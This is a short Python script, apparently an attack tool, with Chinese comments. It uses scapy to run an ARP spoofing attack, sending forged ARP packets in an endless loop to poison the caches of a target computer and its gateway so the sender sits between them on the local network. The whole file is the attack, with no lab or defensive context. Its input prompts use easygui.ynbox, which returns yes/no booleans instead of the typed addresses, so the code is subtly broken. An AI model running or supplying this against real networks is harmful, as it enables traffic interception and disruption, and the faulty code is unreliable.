import easygui


from scapy.all import ARP, Ether, sendp

def send_fake_arp():

    # 目标电脑IP
    target_ip = easygui.ynbox(' 目标电脑IP ')
    # 网关IP
    gateway_ip = easygui.ynbox(' 网关IP ')
    # 目标电脑MAC地址，需提前获取
    target_mac = easygui.ynbox(' 目标电脑MAC地址，需提前获取 ')
    # 网关MAC地址，需提前获取
    gateway_mac = easygui.ynbox(' 网关MAC地址，需提前获取 ')
    arp_to_target = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    arp_to_gateway = ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    while True:
        sendp(Ether(dst=target_mac) / arp_to_target, verbose=0)
        sendp(Ether(dst=gateway_mac) / arp_to_gateway, verbose=0)

if (__name__ == '__main__'):
    send_fake_arp()
